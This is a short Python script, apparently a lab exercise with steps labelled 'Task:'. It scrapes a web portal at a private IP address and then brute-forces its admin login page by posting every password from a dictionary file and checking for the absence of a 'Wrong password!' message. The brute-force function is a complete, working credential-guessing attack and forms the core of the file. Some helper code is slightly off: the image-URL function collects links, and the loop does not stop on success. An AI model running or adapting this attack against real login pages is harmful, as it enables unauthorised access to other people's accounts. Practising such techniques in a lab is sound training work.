#!/usr/bin/env python3

import requests
from bs4 import BeautifulSoup
#Task: Check if web portal is up by using GET request
response = requests.get('http://192.168.1.116/admin/')

#Task: Print headers
#print(response.headers)

#Task: Print content
#print(response.content)

#Task: Print content in a pretty form
soup = BeautifulSoup(response.content, 'html.parser')
#print(soup.prettify())

#Task: Print the title of the web portal
print(soup.title)

#Task: Print the URLs for images present on the homepage
def getImageURLs():
    imgs = soup.find_all("a", href=True)
    imgs_href = []
    for img in imgs:
        imgs_href.append(img['href'])

    imgs_set = set(imgs_href)

    for img in imgs_set:
        print(img)

#Task: Can you access the admin section?
admin_site = requests.get('http://192.168.1.116/admin/index.php?login')
soup_admin_site = BeautifulSoup(admin_site.content, 'html.parser')
#print(soup_admin_site.prettify())

#Task: Bruteforce the login page
def bruteforcePW():
    passfile = 'dict.txt'
    with open(passfile, 'r') as f:
        for word in f:
            word = word.strip('\n')
            trying = requests.post('http://192.168.1.116/admin/index.php?login', data={'pw':word})

            if 'Wrong password!' not in trying.text:
                print('Succcess, the password is %s' % word)
            else:
                print('Incorrect password %s' % word)

bruteforcePW()